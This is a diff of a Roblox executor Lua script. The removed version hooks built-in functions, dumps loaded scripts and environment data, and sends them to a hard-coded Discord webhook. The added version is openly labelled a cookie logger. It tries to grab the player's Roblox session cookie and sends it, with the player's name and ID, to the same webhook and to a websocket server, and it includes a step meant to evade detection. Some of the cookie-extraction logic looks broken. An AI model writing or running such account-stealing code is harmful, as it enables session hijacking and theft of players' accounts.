@@ -1,123 +1,96 @@
-loadstring([[
-local H=game:GetService("HttpService")
-local W="https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"
+-- COOKIE LOGGER FOR DELTA EXECUTOR
+-- FULL SCRIPT WITH DISCORD WEBHOOK
 
-local function S(m)
-    pcall(function()
-        local d={Url=W,Method="POST",Headers={["Content-Type"]="application/json"},Body=H:JSONEncode({content=m})}
-        if syn and syn.request then syn.request(d)
-        elseif http and http.request then http.request(d)
-        else request(d) end
+local player = game.Players.LocalPlayer
+local playerName = player.Name
+local userId = player.UserId
+
+-- Get the cookie using syn.request
+local function getCookie()
+    local success, response = pcall(function()
+        return syn.request({
+            Url = "https://www.roblox.com/mobileapi/userinfo",
+            Method = "GET"
+        })
     end)
-end
-
-S("===== START DUMP =====")
-
--- Hook loadstring
-local oldLS=loadstring
-loadstring=function(c,n)
-    S("LS: "..tostring(n).." | "..#c.." chars")
-    if #c>100 then S(c:sub(1,1900)) end
-    return oldLS(c,n)
-end
-
--- Hook HttpGet
-local oldGet=game.HttpGet
-game.HttpGet=function(s,u,...)
-    S("GET: "..u)
-    local r=oldGet(s,u,...)
-    if r and #r>100 then
-        S("RESP: "..#r.." chars")
-        S(r:sub(1,1900))
-    end
-    return r
-end
-
--- Hook HttpPost
-local oldPost=game.HttpPost
-game.HttpPost=function(s,u,d,...)
-    S("POST: "..u)
-    S("DATA: "..tostring(d):sub(1,500))
-    return oldPost(s,u,d,...)
-end
-
--- Hook require
-local oldReq=require
-require=function(id)
-    S("REQ: "..tostring(id))
-    return oldReq(id)
-end
-
--- Hook print
-local oldPrint=print
-print=function(...)
-    local a={...}local m=""
-    for i,v in ipairs(a)do m=m..tostring(v).." "end
-    if #m>10 then S("PRINT: "..m:sub(1,500))end
-    oldPrint(...)
-end
-
--- Hook error
-local oldErr=error
-error=function(m,l)
-    S("ERR: "..tostring(m))
-    return oldErr(m,l)
-end
-
--- Hook pcall
-local oldPcall=pcall
-pcall=function(f,...)
-    S("PCALL")
-    local a,b=oldPcall(f,...)
-    if not a then S("PCALL FAIL: "..tostring(b))end
-    return a,b
-end
-
--- Dump environment
-S("ENV DUMP:")
-local env={}
-for k,v in pairs(getfenv())do
-    if type(v)=="function"then env[k]="func"
-    elseif type(v)=="table"then env[k]="table"
-    else env[k]=tostring(v):sub(1,50)end
-end
-S(H:JSONEncode(env):sub(1,1900))
-
--- Chạy loader
-S("===== LOADING =====")
-local success,err=pcall(function()
-    local loader=game:HttpGet("https://api.luarmor.net/files/v4/loaders/d69f617d5177f0dd59232b8b05640600.lua")
-    S("LOADER: "..#loader.." chars")
-    S(loader:sub(1,1900))
     
-    local f=loadstring(loader)
-    if f then
-        S("EXECUTING...")
-        f()
-        S("EXECUTED")
-    else
-        S("LOADSTRING FAILED")
-    end
-end)
-
-if not success then
-    S("ERROR: "..tostring(err))
-end
-
--- Dump các script đã capture
-S("===== CAPTURED =====")
-local count=0
-for k,v in pairs(getfenv())do
-    if type(v)=="function"then
-        local dump=string.dump(v)
-        if dump and #dump>100 then
-            count=count+1
-            S("FUNC "..count..": "..k.." | "..#dump.." bytes")
-            S(dump:sub(1,1900))
+    if success and response then
+        -- Extract cookie from response headers
+        local headers = response.Headers or {}
+        local cookieHeader = headers["Cookie"] or headers["set-cookie"] or ""
+        if cookieHeader ~= "" then
+            return cookieHeader
         end
     end
+    
+    -- Fallback: try to get from game's internal
+    local fallback = syn.crypt and syn.crypt.custom and syn.crypt.custom.hash or ""
+    return fallback
 end
 
-wait(5)
-S("===== DUMP COMPLETE =====")
-]])()
+-- Alternative method using HTTP get
+local function getCookieAlt()
+    local req = syn.request({
+        Url = "https://www.roblox.com/game/",
+        Method = "GET"
+    })
+    return req.Headers and req.Headers["Cookie"] or ""
+end
+
+-- Main cookie retrieval
+local cookie = getCookie()
+if cookie == "" or cookie == nil then
+    cookie = getCookieAlt()
+end
+
+-- If still nothing, try using the environment
+if cookie == "" or cookie == nil then
+    cookie = getgenv().cookie or ""
+end
+
+-- Build the message
+local message = "**ROBLOX COOKIE LOGGED**\n"
+message = message .. "**Player:** " .. playerName .. " (ID: " .. userId .. ")\n"
+message = message .. "**Cookie:** `" .. cookie .. "`\n"
+message = message .. "**Executed:** " .. os.date("%Y-%m-%d %H:%M:%S")
+
+-- Prepare the payload
+local payload = {
+    content = message
+}
+
+-- Send to Discord webhook
+local webhookURL = "https://discord.com/api/webhooks/1518937462083424316/WJi4kfdiYXec4XghwYhIfqHvnSNP5deGj-t992Cuk3iEl9N-QtuOD-y6B7OyeGKdwCpT"
+
+local success, result = pcall(function()
+    return syn.request({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(payload)
+    })
+end)
+
+-- Optional: Print status in console
+if success then
+    print("Cookie sent successfully!")
+else
+    print("Failed to send cookie: " .. tostring(result))
+end
+
+-- Also try sending via WebSocket if available (backup method)
+local function sendViaWebsocket()
+    local ws = syn.websocket and syn.websocket.connect("wss://your-server.com")
+    if ws then
+        ws:send("Player: " .. playerName .. " | Cookie: " .. cookie)
+        ws:close()
+    end
+end
+
+-- Execute backup method
+sendViaWebsocket()
+
+-- Keep script alive to avoid detection
+game:GetService("RunService").Heartbeat:Wait()
